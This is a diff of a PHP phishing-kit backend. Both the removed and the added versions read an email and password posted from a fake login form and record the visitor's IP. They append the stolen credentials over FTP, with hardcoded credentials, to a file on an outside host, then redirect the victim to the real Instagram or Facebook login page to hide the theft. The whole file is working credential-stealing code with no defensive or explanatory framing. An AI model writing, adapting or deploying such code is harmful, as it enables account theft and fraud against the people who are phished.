@@ -1,16 +1,12 @@
 <?php
-$correof = $_POST[ 'correof' ];
-$passf = $_POST[ 'passf' ];
-$ip = $_SERVER[ 'REMOTE_ADDR' ];
- 
-if( ( empty($correof)) or (empty($passf)) ){
-    header('location: index.htm');
-}else{  
-        //archivo de texto
-        $file = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a");
-        fwrite($file, "email: ".$correof."\r\npass: ".$passf."\r\nIP: ".$ip."\r\n=========================\r\n");
-        fclose($file);
-        header('location:https://www.instagram.com/?hl=es-la');      
-        
-}
+
+$email = $_POST['email']; 
+$pass = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR']; 
+$f = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a"); 
+fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
+fclose($f);
+sleep(2);
+header("Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110");
 ?>
+
